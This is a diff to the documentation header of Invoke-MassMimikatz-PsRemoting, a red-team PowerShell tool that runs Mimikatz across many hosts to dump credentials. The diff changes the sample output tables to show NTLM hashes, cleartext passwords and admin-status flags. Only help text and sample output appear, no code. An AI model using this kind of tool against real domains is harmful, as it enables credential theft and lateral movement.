@@ -6,7 +6,7 @@ Script mod author
 Description
     This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.
     Features/credits:
-    	 - Idea: rob, will, and carlos
+   	 - Idea: rob, will, and carlos
 	 - Input: Accepts host from pipeline (will's code)
 	 - Input: Accepts host list from file (will's code)
 	 - AutoTarget option will lookup domain computers from DC (carlos's code)
@@ -60,12 +60,17 @@ Output Sample 1
     VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
     VERBOSE: Removing ps sessions...
 
-    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
-    ------      --------      --------                         --------------- -----------    
-    test        administrator MyEAPassword!                    Unknown         Unknown    
-    test.domain administrator MyEAPassword!                    Unknown         Unknown    
-    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
-    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       
+    Type      Domain      Username      Password                         EnterpriseAdmin DomainAdmin
+    ----      ------      --------      --------                         --------------- -----------
+    ntlm hash test        administrator 48114a647011bd6ae5bd2af865aa498f Unknown         Unknown        
+    cleartext test        administrator MyEAPassword!                    Unknown         Unknown        
+    cleartext test.domain administrator MyEAPassword!                    Unknown         Unknown        
+    cleartext test        myadmin       MyDAPassword!                    Unknown         Unknown        
+    cleartext test.domain myadmin       MyDAPassword!                    Unknown         Unknown        
+    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 Unknown         Unknown 
+    cleartext test        myadmin       MyUserPassword!                  Unknown         Unknown        
+    cleartext test.domain myadmin       MyUSerPassword!                  Unknown         Unknown        
+    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 Unknown         Unknown            
 
 Output Sample 2
 
@@ -81,14 +86,17 @@ PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\u
     VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
     VERBOSE: Removing ps sessions...
 
-    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
-    ------      --------      --------                         --------------- -----------    
-    test        administrator MyEAPassword!                    Yes             Yes    
-    test.domain administrator MyEAPassword!                    Yes             Yes     
-    test        myadmin       MyDAPAssword!                    No              Yes     
-    test.domain myadmin       MyDAPAssword!                    No              Yes 
-    test        myuser        MyUserPAssword!                  No              No
-    test.domain myuser        MyUSerPAssword!                  No              No                
+    Type      Domain      Username      Password                         EnterpriseAdmin DomainAdmin
+    ----      ------      --------      --------                         --------------- -----------
+    ntlm hash test        administrator 48114a647011bd6ae5bd2af865aa498f Yes             Yes        
+    cleartext test        administrator MyEAPassword!                    Yes             Yes        
+    cleartext test.domain administrator MyEAPassword!                    Yes             Yes        
+    cleartext test        myadmin       MyDAPassword!                    No              Yes        
+    cleartext test.domain myadmin       MyDAPassword!                    No              Yes        
+    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 No              Yes 
+    cleartext test        myadmin       MyUserPassword!                  No              No        
+    cleartext test.domain myadmin       MyUSerPassword!                  No              No        
+    ntlm hash test        myadmin       68ed2cc11cd1b1bd0f29c7f6afe95c92 No              No                  
 
 
 Todo
